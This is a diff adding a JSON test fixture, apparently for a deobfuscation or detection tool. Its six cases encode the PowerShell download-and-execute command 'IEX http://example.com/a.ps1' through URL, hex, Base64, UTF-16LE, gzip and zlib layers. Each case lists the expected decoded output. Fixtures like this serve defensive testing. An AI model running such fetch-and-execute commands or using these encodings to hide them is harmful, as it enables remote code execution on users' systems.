@@ -1,0 +1,38 @@
+[
+  {
+    "name": "url_encoded_powershell",
+    "payload": "IEX%20http%3A%2F%2Fexample.com%2Fa.ps1",
+    "expected": "IEX http://example.com/a.ps1",
+    "layer_prefix": "URL decode"
+  },
+  {
+    "name": "hex_encoded_powershell",
+    "payload": "49455820687474703a2f2f6578616d706c652e636f6d2f612e707331",
+    "expected": "IEX http://example.com/a.ps1",
+    "layer_prefix": "Hex"
+  },
+  {
+    "name": "base64_utf8_powershell",
+    "payload": "SUVYIGh0dHA6Ly9leGFtcGxlLmNvbS9hLnBzMQ==",
+    "expected": "IEX http://example.com/a.ps1",
+    "layer_prefix": "Base64"
+  },
+  {
+    "name": "base64_utf16le_powershell",
+    "payload": "SQBFAFgAIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQA=",
+    "expected": "IEX http://example.com/a.ps1",
+    "layer_prefix": "Base64"
+  },
+  {
+    "name": "base64_gzip_powershell",
+    "payload": "H4sIAAAAAAAC//N0jVDIKCkpsNLXT61IzC3ISdVLzs/VT9QrKDYEAMTt7q4cAAAA",
+    "expected": "IEX http://example.com/a.ps1",
+    "layer_prefix": "Base64 -> GZIP"
+  },
+  {
+    "name": "base64_zlib_powershell",
+    "payload": "eJzzdI1QyCgpKbDS10+tSMwtyEnVS87P1U/UKyg2BACI3wmK",
+    "expected": "IEX http://example.com/a.ps1",
+    "layer_prefix": "Base64 -> ZLIB"
+  }
+]
